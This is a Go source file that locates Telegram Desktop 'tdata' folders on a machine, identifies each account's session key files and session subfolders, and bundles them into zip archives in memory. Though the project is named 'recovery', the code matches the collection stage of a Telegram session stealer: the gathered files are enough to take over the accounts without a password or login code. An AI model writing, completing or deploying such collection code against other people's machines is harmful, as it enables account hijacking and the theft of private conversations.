package scanner

import (
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

type telegramPathConfig struct {
	name    string
	subPath string
	base    string
}

var tdataSessionFiles = map[string]bool{
	"key_datas": true,
	"usertag":   true,
	"settings0": true,
	"settings1": true,
	"configs":   true,
}

func isTdataSessionDir(name string) bool {
	if len(name) != 16 {
		return false
	}
	for _, c := range name {
		if !((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f')) {
			return false
		}
	}
	return true
}

func ScanTelegram() []types.TelegramResult {
	var results []types.TelegramResult

	for _, tp := range getTelegramPaths() {
		base := resolveTelegramBase(tp.base)
		if base == "" {
			continue
		}

		tdataDir := filepath.Join(base, tp.subPath)
		if _, err := os.Stat(tdataDir); err != nil {
			continue
		}

		accounts := findTelegramAccounts(tdataDir)
		for _, acc := range accounts {
			results = append(results, types.TelegramResult{
				Account: acc.account,
				Path:    acc.path,
				Files:   acc.files,
				Size:    acc.size,
			})
		}
	}

	return results
}

type telegramAccount struct {
	account string
	path    string
	files   int
	size    int64
}

func findTelegramAccounts(tdataDir string) []telegramAccount {
	var accounts []telegramAccount

	entries, err := os.ReadDir(tdataDir)
	if err != nil {
		return nil
	}

	hasKeyData := false
	for _, e := range entries {
		if !e.IsDir() && e.Name() == "key_datas" {
			hasKeyData = true
			break
		}
	}

	if hasKeyData {
		files, size := countTdataFiles(tdataDir)
		if files > 0 {
			accounts = append(accounts, telegramAccount{
				account: "Main",
				path:    tdataDir,
				files:   files,
				size:    size,
			})
		}
	}

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		name := e.Name()
		if !isTdataSessionDir(name) {
			continue
		}
		sessionDir := filepath.Join(tdataDir, name)
		sessionEntries, err := os.ReadDir(sessionDir)
		if err != nil {
			continue
		}
		hasData := false
		for _, se := range sessionEntries {
			if !se.IsDir() {
				hasData = true
				break
			}
		}
		if hasData {
			files, size := countTdataSessionFiles(sessionDir)
			accounts = append(accounts, telegramAccount{
				account: name,
				path:    sessionDir,
				files:   files,
				size:    size,
			})
		}
	}

	return accounts
}

func countTdataFiles(tdataDir string) (int, int64) {
	var count int
	var totalSize int64

	entries, err := os.ReadDir(tdataDir)
	if err != nil {
		return 0, 0
	}

	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if tdataSessionFiles[name] || strings.HasSuffix(name, "s") && tdataSessionFiles[strings.TrimSuffix(name, "s")] {
			info, err := e.Info()
			if err != nil {
				continue
			}
			count++
			totalSize += info.Size()
		}
	}

	return count, totalSize
}

func countTdataSessionFiles(dir string) (int, int64) {
	var count int
	var totalSize int64

	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		count++
		totalSize += info.Size()
		return nil
	})

	return count, totalSize
}

func ZipTelegram(path string) ([]byte, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if !info.IsDir() {
		return nil, os.ErrNotExist
	}

	// If this is a session subfolder (hex name), just zip its contents directly
	if isTdataSessionDir(filepath.Base(path)) {
		return ziputil.ZipDirectory(path)
	}

	// Otherwise this is the tdata root — zip key files + session subdirs
	return zipTdataRoot(path)
}

func zipTdataRoot(tdataDir string) ([]byte, error) {
	entries, err := os.ReadDir(tdataDir)
	if err != nil {
		return nil, err
	}

	var filesToZip []string

	for _, e := range entries {
		name := e.Name()
		if e.IsDir() {
			if isTdataSessionDir(name) {
				sessionDir := filepath.Join(tdataDir, name)
				filepath.Walk(sessionDir, func(path string, info os.FileInfo, err error) error {
					if err != nil || info.IsDir() {
						return nil
					}
					if info.Size() < 50*1024*1024 {
						filesToZip = append(filesToZip, path)
					}
					return nil
				})
			}
		} else {
			if tdataSessionFiles[name] || strings.HasPrefix(name, "key_data") || strings.HasPrefix(name, "map") {
				info, _ := e.Info()
				if info != nil && info.Size() < 50*1024*1024 {
					filesToZip = append(filesToZip, filepath.Join(tdataDir, name))
				}
			}
		}
	}

	if len(filesToZip) == 0 {
		return nil, os.ErrNotExist
	}

	return ziputil.ZipFiles(filesToZip, tdataDir)
}
